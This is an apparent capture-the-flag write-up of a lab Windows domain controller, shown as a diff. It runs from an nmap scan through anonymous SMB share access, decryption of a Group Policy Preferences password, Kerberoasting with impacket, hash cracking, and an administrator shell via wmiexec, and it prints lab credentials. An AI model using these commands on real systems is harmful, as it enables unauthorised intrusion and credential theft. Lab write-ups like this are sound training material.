@@ -1,0 +1,88 @@
+so we begin by doing an nmap scan and we obtain the results
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 12:38 EAT
+Nmap scan report for 10.10.10.100
+Host is up (0.68s latency).
+Not shown: 982 closed tcp ports (conn-refused)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-12 09:39:11Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49165/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -1s
+| smb2-security-mode: 
+|   210: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2023-07-12T09:40:22
+|_  start_date: 2023-07-12T09:36:04
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 146.96 secondds
+
+
+we enum port 135 but there is really nothing much over there.... so we move to smb(port 445) where using enum4linux we see that we have both access of reading and listing  files over the Replication share... 
+
+
+
+smbclient //10.10.10.100/Replication                             
+Password for [WORKGROUP\isayar17_x401a]:
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> RECURSE ON
+smb: \> PROMPT OFF
+smb: \> mget *
+
+
+so what happens is the the recurse on allows smbclient to traverse in the share... including subdirectories... directories... and includes all files in the file transfer operation.... 
+
+for the prompt off it disables the interactive prompts during the file transfer while mget * initiates the file transfer operation and retrieves all files() in the current directory from the SMB server to the local machine.
+
+so using the command smbclient //10.10.10.100/Replication -N -c "cd active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups; get Groups.xml" -t 15 
+
+I was ale to download the file the reason i began with cd was to first of all be in the remote file path so that I can download the file in the local file path because get does not support downloading just using the remote file path...
+
+
+after downloading it I learned something about GPP(Group Policy Preferences) which was introduced in Windows Server 2008 to help administrators modify settings belonging to users and groups across the network... one particular use case was to change the password for the local admin account on multiple machines... 
+
+To do so the admins would define the new password in the GPP settings and store it in a file called Groups.xml the password was encrypted using the AES-256 Encryption Algorithm... but the Microsoft Developer Network unintentionally released the encryption algorithm of the AES-256 Encryption Algorithm... back in 2012 which made it simple to decrypt and obtain the password
+
+so using gppdecrypt I got the password as GPPstillStandingStrong2k18 for the user SVC_TGS 
+
+a classic case of kerberosting whereby I will be retrieving the TGS and cracking it to obtain the password... the TGS contains the NTLM Hash  that can be cracked too..... but  inorder we get the TGS we need to identify the service principal name for the account
+
+impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100  -request
+
+the getUserSPNs does not only retrieve the SPNS that have been configured for the users in the domain but it also retrieves the hash of the spn that we retrieve...The spn belongs to Administrator... and the hash also belongs to the Administrator so we crack the hash and we get the password as Ticketmaster1968​ ... This is a jackpot...
+
+
+using:
+
+impacket-wmiexec active.htb/administrator:Ticketmaster1968@10.10.10.100
+
+
+we get access as administrator...
+
+
+
+
+
